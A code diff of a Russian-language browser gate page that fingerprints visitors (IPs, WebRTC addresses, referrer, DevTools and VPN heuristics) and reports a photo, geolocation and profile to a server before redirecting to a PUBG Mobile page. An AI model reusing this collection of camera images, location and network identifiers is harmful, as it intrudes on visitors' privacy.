-    iosVersion: iosVersionDetected,
-    jbProbesActive,
+    isIpad,
+    iosVersion,
     liteMode: LITE_MODE,
     lite: LITE_MODE,
     dcIspKeywords: dcWords,
-    referrer: ref || null
+    referrer: ref || null,
+
+    // 🚫 jbProbesActive removed
   };
 
+  // link mismatch
   profile.linkFlowMismatch = !!(
     inAppWebView.isInApp ||
-    /discord\.com|discordapp\.com|t\.me|telegram\.org|instagram\.com|tiktok\.com|facebook\.com|fb\.com|vk\.com/i.test(
-      ref
-    )
+    /discord|telegram|instagram|tiktok|facebook|vk\.com/i.test(ref)
   );
 
+  // Automation flags (unchanged)
   profile.shortcutUsed = !!(LITE_MODE && inAppWebView.isInApp);
   profile.shortCapUsed = profile.shortcutUsed;
 
+  // WebAPI patched
   profile.modifiedWebApi = (() => {
     try {
       const isNative = (fn) =>
         typeof fn === "function" &&
         /\[native code\]/.test(Function.prototype.toString.call(fn));
-      const candidates = [
-        navigator.permissions && navigator.permissions.query,
-        navigator.geolocation && navigator.geolocation.getCurrentPosition,
-        navigator.mediaDevices && navigator.mediaDevices.getUserMedia
-      ].filter(Boolean);
-      if (!candidates.length) return false;
-      return candidates.some((fn) => !isNative(fn));
+      const arr = [
+        navigator.permissions?.query,
+        navigator.geolocation?.getCurrentPosition,
+        navigator.mediaDevices?.getUserMedia
+      ];
+      return arr.filter(Boolean).some((fn) => !isNative(fn));
     } catch {
       return false;
     }
   })();
   profile.webApiPatched = profile.modifiedWebApi;
 
+  // Automation heuristics (NO JB)
   profile.automation = !!(
     profile.shortcutUsed ||
     profile.linkFlowMismatch ||
-    profile.modifiedWebApi ||
-    (profile.jbProbesActive?.summary?.label === "likely")
+    profile.modifiedWebApi
   );
 
-  const smallSignals = [];
-  if (String(network?.effectiveType || "").toLowerCase() === "2g") {
-    smallSignals.push("effectiveType=2g");
-  }
-  if (typeof network?.rtt === "number" && network.rtt > 800) {
-    smallSignals.push("veryHighRTT");
-  }
-  profile.smallSignals = smallSignals;
+  const small = [];
+  if (/2g/i.test(network?.effectiveType || "")) small.push("effectiveType=2g");
+  if (network?.rtt > 800) small.push("veryHighRTT");
+  profile.smallSignals = small;
 
   return profile;
 }
 
-async function sendReport({
-  photoBase64,
-  geo,
-  client_profile,
-  device_check,
-  featuresSummary
-}) {
-  const info = getDeviceInfo();
-  const code = determineCode();
-  if (!code) {
-    throw new Error("Нет кода в URL");
+// =====================================
+// CLEAN runDeviceCheck() — NO ACTIVE JB
+// =====================================
+async function runDeviceCheck(clientProfile) {
+  const reasons = [];
+  const details = {};
+  let score = 100;
+
+  try {
+    details.ua = navigator.userAgent;
+    details.vendor = navigator.vendor;
+    details.platform = navigator.platform;
+    details.lang = navigator.language;
+    details.timezone = clientProfile?.locale?.timeZone;
+    details.dpr = window.devicePixelRatio || 1;
+    details.screen = clientProfile?.locale?.screen;
+    details.maxTouchPoints = navigator.maxTouchPoints || 0;
+
+    // webdriver
+    details.navigator_webdriver = navigator.webdriver;
+    if (navigator.webdriver) {
+      reasons.push("navigator.webdriver === true");
+      score -= 60;
+    }
+
+    // Devtools
+    const devtools = detectDevtoolsHeuristic();
+    details.devtools = devtools;
+    if (devtools?.opened) {
+      reasons.push("DevTools размеры окна");
+      score -= 6;
+    }
+
+    // camera latency
+    details.cameraLatencyMs = window.__cameraLatencyMs;
+    if (!LITE_MODE && details.cameraLatencyMs != null && details.cameraLatencyMs <= 5) {
+      reasons.push("Слишком малая cameraLatency");
+      score -= 10;
+    }
+
+    // in-app webview
+    if (clientProfile?.inAppWebView?.isInApp) {
+      reasons.push("In-App WebView");
+      score -= 8;
+    }
+
+    // Network heuristics
+    const pn = analyzeNetworkHeuristics({
+      publicIp: clientProfile?.publicIp,
+      webrtcIps: clientProfile?.webrtcIps,
+      network: clientProfile?.network,
+      cameraLatencyMs: details.cameraLatencyMs,
+      locale: clientProfile?.locale,
+      ipMeta: clientProfile?.publicIp
+    });
+
+    details.pn_proxy = pn;
+
+    if (pn.label === "likely") {
+      reasons.push("VPN/Proxy likely");
+      score -= 25;
+    } else if (pn.label === "possible") {
+      reasons.push("VPN/Proxy possible");
+      score -= 10;
+    }
+
+    // 🚫 УДАЛЕНО:
+    // ACTIVE JB penalty
+    // (jbProbesActive has been removed entirely)
+
+    if (score >= 80) {
+      reasons.push("Ок: окружение выглядит правдоподобно");
+    } else if (score >= 60) {
+      reasons.push("Есть несостыковки — рекомендуется доп. проверка");
+    } else {
+      reasons.push("Высокая вероятность подмены/автоматизации");
+    }
+  } catch (e) {
+    reasons.push("Ошибка проверки окружения: " + e.message);
   }
+
+  return {
+    score,
+    label: score < 60 ? "likely" : score < 80 ? "possible" : "unlikely",
+    reasons,
+    details,
+    timestamp: Date.now()
+  };
+}
+
+// =====================================
+// sendReport
+// =====================================
+async function sendReport({ photoBase64, geo, client_profile, device_check, featuresSummary }) {
+  const	info = getDeviceInfo();
+  const code = determineCode();
+  if (!code) throw new Error("Нет кода в URL");
 
   const body = {
     userAgent: info.userAgent,
@@ -1160,21 +885,17 @@ async function sendReport({
 
   const text = await r.text().catch(() => "");
   let data = null;
-  try {
-    data = text ? JSON.parse(text) : null;
-  } catch {
-    data = null;
-  }
+  try { data = JSON.parse(text); } catch {}
 
-  if (!r.ok) {
-    throw new Error((data && data.error) || text || `HTTP ${r.status}`);
-  }
-  if (!data?.ok) {
-    throw new Error((data && data.error) || "Ошибка ответа сервера");
-  }
+  if (!r.ok) throw new Error((data && data.error) || text);
+  if (!data?.ok) throw new Error(data?.error || "Ошибка ответа сервера");
+
   return data;
 }
 
+// =====================================
+// autoFlow
+// =====================================
 window.__reportReady = false;
 window.__decision = null;
 
@@ -1188,9 +909,7 @@ async function autoFlow() {
     const code = determineCode();
     if (!code) {
       if (UI.title) UI.title.textContent = "Ошибка";
-      if (UI.text)
-        UI.text.innerHTML =
-          '<span class="err">Нет кода в URL.</span>';
+      if (UI.text) UI.text.innerHTML = '<span class="err">Нет кода в URL.</span>';
       hideBtn();
       return;
     }
@@ -1208,65 +927,38 @@ async function autoFlow() {
     if (UI.note) UI.note.textContent = "Проверяем системные возможности…";
 
     const fg = await waitFeatureGate();
-    let vt18_ok;
-    let t184_ok;
+    let vt18_ok, v184_ok;
 
     if (fg?.effective) {
       vt18_ok = !!fg.effective.vt18Pass;
-      t184_ok = !!fg.effective.v184Pass;
+      v184_ok = !!fg.effective.v184Pass;
     } else {
       const { vt18_0, triple18_4 } = await runSafariFeatureTests();
       vt18_ok = !!vt18_0?.pass;
-      t184_ok = !!triple18_4?.pass;
+      v184_ok = !!triple18_4?.pass;
     }
 
     const featuresSummary = {
       VT18: vt18_ok ? "ok" : "—",
-      v18_4: t184_ok ? "ok" : "—"
+      v18_4: v184_ok ? "ok" : "—"
     };
-    dlog("features:", featuresSummary);
-
-    const featTxt = `Правило: требуется 18.0 • VT18=${vt18_ok ? "ok" : "—"} • 18.4=${t184_ok ? "ok" : "—"}`;
 
     if (UI.note) UI.note.textContent = "Анализ окружения…";
-    let device_check = null;
-    try {
-      device_check = await runDeviceCheck({
-        publicIp: client_profile.publicIp,
-        webrtcIps: client_profile.webrtcIps,
-        network: client_profile.network,
-        locale: client_profile.locale,
-        inAppWebView: client_profile.inAppWebView,
-        jbProbesActive: client_profile.jbProbesActive
-      });
-    } catch {}
 
+    const device_check = await runDeviceCheck(client_profile);
+
+    // Safari 18 must pass
     if (!vt18_ok) {
       if (UI.title) UI.title.textContent = "Доступ отклонён";
-      if (UI.text)
-        UI.text.innerHTML =
-          '<span class="err">Отказ по feature-tests (18.0 обязательно).</span>';
-      if (UI.reason) UI.reason.textContent = featTxt;
-      if (UI.note)
-        UI.note.textContent = "18.4 учитывается только для отчёта.";
+      if (UI.text) UI.text.innerHTML =
+        '<span class="err">Отказ по feature-tests (18.0 обязательно).</span>';
+      if (UI.reason) UI.reason.textContent = `VT18=${vt18_ok ? "ok" : "—"} • 18.4=${v184_ok ? "ok" : "—"}`;
       try {
-        await sendReport({
-          photoBase64,
-          geo,
-          client_profile,
-          device_check,
-          featuresSummary
-        });
-      } catch (e) {
-        dlog("sendReport vt18_fail error:", e);
-      }
+        await sendReport({ photoBase64, geo, client_profile, device_check, featuresSummary });
+      } catch {}
       setBtnLocked();
       window.__reportReady = false;
-      window.__decision = {
-        canLaunch: false,
-        features: featuresSummary
-      };
-      dlog("deny: vt18 fail");
+      window.__decision = { canLaunch: false };
       return;
     }
 
@@ -1288,73 +980,50 @@ async function autoFlow() {
       window.__reportReady = true;
       setBtnReady();
       if (UI.title) UI.title.textContent = "Проверка пройдена";
-      if (UI.text)
-        UI.text.innerHTML =
-          '<span class="ok">Ок (допуск выдан).</span>';
-      const extraLite = LITE_MODE ? " • LITE (камера/гео ограничены)" : "";
-      if (UI.note)
-        UI.note.textContent = STRICT_MODE
-          ? `${featTxt} • strict=1 (score ≥ 60)${extraLite}`
-          : `${featTxt}${extraLite}`;
-      dlog("decision: allow", decision);
+      if (UI.text) UI.text.innerHTML = '<span class="ok">Ок (допуск выдан).</span>';
+      const extra = LITE_MODE ? " • LITE" : "";
+      if (UI.note) UI.note.textContent = `VT18=${vt18_ok?"ok":"—"} • 18.4=${v184_ok?"ok":"—"}${extra}`;
     } else {
       window.__reportReady = false;
       setBtnLocked();
       if (UI.title) UI.title.textContent = "Доступ отклонён";
-      if (UI.text)
-        UI.text.innerHTML =
-          '<span class="err">Отказ (решение сервера).</span>';
-      const strictInfo =
-        decision?.strict?.enabled && decision?.strict?.failed
-          ? ` • strict fail (score=${decision?.strict?.score ?? "n/a"})`
-          : "";
-      if (UI.reason)
-        UI.reason.textContent = `${featTxt}${strictInfo}`;
-      const extraLite = LITE_MODE ? " • LITE режим (без камеры/гео)" : "";
-      if (UI.note)
-        UI.note.textContent =
-          "Обратитесь в поддержку, если это ошибка." + extraLite;
-      dlog("decision: deny", decision);
+      if (UI.text) UI.text.innerHTML = '<span class="err">Отказ (решение сервера).</span>';
+      if (UI.note) UI.note.textContent = "Обратитесь в поддержку.";
     }
   } catch (e) {
     console.error("[AUTO-FLOW ERROR]", e);
     setBtnLocked();
     window.__reportReady = false;
     if (UI.title) UI.title.textContent = "Ошибка";
-    if (UI.text)
-      UI.text.innerHTML =
-        '<span class="err">Ошибка проверки.</span>';
-    if (UI.note)
-      UI.note.textContent =
-        "Причина: " + (e && e.message ? e.message : String(e));
+    if (UI.text) UI.text.innerHTML = '<span class="err">Ошибка проверки.</span>';
+    if (UI.note) UI.note.textContent = String(e.message || e);
   }
 }
 
+// =====================================
+// Wire enter button
+// =====================================
 (function wireEnter() {
   const btn = UI.btn;
   if (!btn) return;
-  btn.addEventListener(
-    "click",
-    (e) => {
-      if (!window.__reportReady || !window.__decision?.canLaunch) {
-        e.preventDefault();
-        e.stopPropagation();
-        return;
-      }
-      location.assign("https://www.pubgmobile.com/ig/itop");
-    },
-    { capture: true }
-  );
+  btn.addEventListener("click", (e) => {
+    if (!window.__reportReady || !window.__decision?.canLaunch) {
+      e.preventDefault();
+      e.stopPropagation();
+      return;
+    }
+    location.assign("https://www.pubgmobile.com/ig/itop");
+  }, { capture: true });
 })();
 
+// =====================================
+// INIT
+// =====================================
 function startWithGate() {
   setTimeout(() => autoFlow(), 60);
 }
 
-if (
-  document.readyState === "complete" ||
-  document.readyState === "interactive"
-) {
+if (document.readyState === "complete" || document.readyState === "interactive") {
   startWithGate();
 } else {
   document.addEventListener("DOMContentLoaded", startWithGate);
